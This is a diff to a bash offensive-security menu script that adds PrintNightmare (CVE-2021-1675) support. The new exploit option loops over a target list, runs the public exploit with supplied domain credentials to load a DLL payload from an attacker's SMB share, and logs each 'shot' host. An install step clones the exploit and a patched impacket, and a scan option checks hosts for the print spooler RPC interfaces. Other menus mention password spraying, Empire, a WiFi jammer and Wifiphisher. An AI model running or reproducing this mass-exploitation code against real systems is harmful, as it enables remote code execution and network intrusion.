@@ -1012,8 +1012,8 @@ done
  echo -e "\E[1;34m::::: \e[97mExploit All The Things!! \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
-options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Password Spray" "Spray Password List Update" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 10=Main Menu | 11=QUIT: '
+options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Password Spray" "Spray Password List Update" "PrintNightmare Exploit" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1192,7 +1192,20 @@ EOF
 #Usage: spray.sh -genusers <firstnames> <lastnames> "<<fi><li><fn><ln>>"
 #Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fi><ln>"
 #Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fn>.<ln>"  
-#			;;       
+#			;;  
+	"PrintNightmare Exploit")
+	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET!!\E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mCreate DLL Payload For PrintNightmare & Host It On Your SMB Share\E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mStart Your Listener Of Choice (Covenant Preferred)\E[1;34m:::::"
+	inputfile=~/ATAT/MSF_targets.txt
+		read -p 'Set Domain: ' userdomain; read -p 'Set Username: ' username; read -p 'Set Password (NOT MASKED!): ' userpass; read -p 'Set Full SMB Share Path To Payload (ex. \\PCNAME\Share\Payload.dll): ' ATTACKERPCSharePayload;
+	cd ~/CVE-2021-1675/
+	for IP in $(cat $inputfile)
+	do
+	python3 CVE-2021-1675.py $userdomain/$username:$userpass@$IP \'$ATTACKERPCSharePayload\' | tee -a ~/CVE-2021-1675/targets_exploited.txt;\
+	done
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Shot! Check ~/CVE-2021-1675/targets_exploited.txt for Results! \E[1;34m:::::"
+            ;;    
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1209,8 +1222,8 @@ done
          
 echo -e "\E[1;34m::::: \e[97mScan All The Things!! \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 12=Main Menu | 13=QUIT: '
-options=("Multi-Port Auxiliary" "Multi-Target/Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target SSLScan - With Masscan Results" "Multi-Target SSLScan - With Nmap Results" "Multi-Target Masscan of All TCP Ports" "Bloodhound" "Extract All IP:Port Combos From Nmap Output For SSLScan Processing" "changeme - Default Credential Checker" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 13=Main Menu | 14=QUIT: '
+options=("Multi-Port Auxiliary" "Multi-Target/Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target SSLScan - With Masscan Results" "Multi-Target SSLScan - With Nmap Results" "Multi-Target Masscan of All TCP Ports" "Bloodhound" "Extract All IP:Port Combos From Nmap Output For SSLScan Processing" "changeme - Default Credential Checker" "PrintNightmare Scan" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1367,7 +1380,7 @@ select opt in "${options[@]}"
             ;;
         "Resume")
     masscan --resume paused.conf
-			;;           
+			;;     
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1419,10 +1432,22 @@ select opt in "${options[@]}"
 			inputfile=~/ATAT/MSF_targets.txt
      for IP in $(cat $inputfile)
      do
-     python ~/changeme/changeme.py -a --timeout 5 $IP --fresh | tee -a ~/ATAT/Default_Creds.txt
+     python3 ~/changeme/changeme.py -a --timeout 5 $IP --fresh | tee -a ~/ATAT/Default_Creds.txt
      done
      echo -e "\E[1;34m::::: \e[97mAll Results Have Been Saved To ~/ATAT/Default_Creds.txt \E[1;34m:::::"
            ;;
+    "PrintNightmare Scan")
+	echo -e "\E[1;34m::::: \e[97mCheck for PrintNightmare \E[1;34m:::::"
+	inputfile=~/ATAT/MSF_targets.txt
+	cd ~/CVE-2021-1675/impacket/examples/
+	for IP in $(cat $inputfile)
+	do
+	echo $IP | tee -a ~/CVE-2021-1675/targets_found.txt
+	python3 rpcdump.py @$IP | egrep 'MS-RPRN|MS-PAR' | tee -a ~/CVE-2021-1675/targets_found.txt;\
+	done
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned! Check ~/CVE-2021-1675/targets_found.txt for Results! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mOnly Valid IPs Will Have Results Below Them In The Output File. All Other IPs Listed Are Not Vulnerable. \E[1;34m:::::"
+            ;;
     "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1441,8 +1466,8 @@ done
   echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!! \E[1;34m:::::"
   echo -e "\E[1;34m::::: \e[97mONLY INSTALL ONE Powershell Empire. BC-SECURITY Is The Maintained Version. Only Use The Legacy PSE If You Know What You Are Doing! \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 15=Main Menu | 16=QUIT: '
-options=("Powershell Empire & DeathStar" "BC-SECURITY Powershell Empire & Starkiller" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Pupy Install" "BeRoot Install" "GhostPack Install" "Hashcat Install" "Wifiphisher Install" "Non-Security Debian Distros-BETA" "Main Menu" "Quit") #"HostAPD-WPE via Github" "Kernelpop Install"
+PS3='Enter your choice: ENTER=Options Menu | 16=Main Menu | 17=QUIT: '
+options=("Powershell Empire & DeathStar" "BC-SECURITY Powershell Empire & Starkiller" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Pupy Install" "BeRoot Install" "GhostPack Install" "Hashcat Install" "Wifiphisher Install" "Non-Security Debian Distros-BETA" "PrintNightmare Install" "Main Menu" "Quit") #"HostAPD-WPE via Github" "Kernelpop Install"
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1861,6 +1886,15 @@ EOF
 	echo -e "\E[1;34m::::: \e[97mRun the \"Airgeddon Install Workaround\" Option Now \E[1;34m:::::"
 	echo ""
 	echo -e "\E[1;34m::::: \e[97mInstall Bloodhound via the instructions here: https://github.com/BloodHoundAD/BloodHound/wiki/Getting-started \E[1;34m:::::"
+			;;
+		"PrintNightmare Install")
+			git clone https://github.com/cube0x0/CVE-2021-1675 ~/CVE-2021-1675
+			cd ~/CVE-2021-1675
+			git clone https://github.com/cube0x0/impacket
+			cd impacket
+			python3 ./setup.py install
+				echo -e "\E[1;34m::::: \e[97mPrintNightmare Scanner and Exploit Installed. Let the Scanning Menu Show You It's Features!\E[1;34m:::::"
+
 			;;
 		"Main Menu")
             ~/ATAT/ATAT.sh
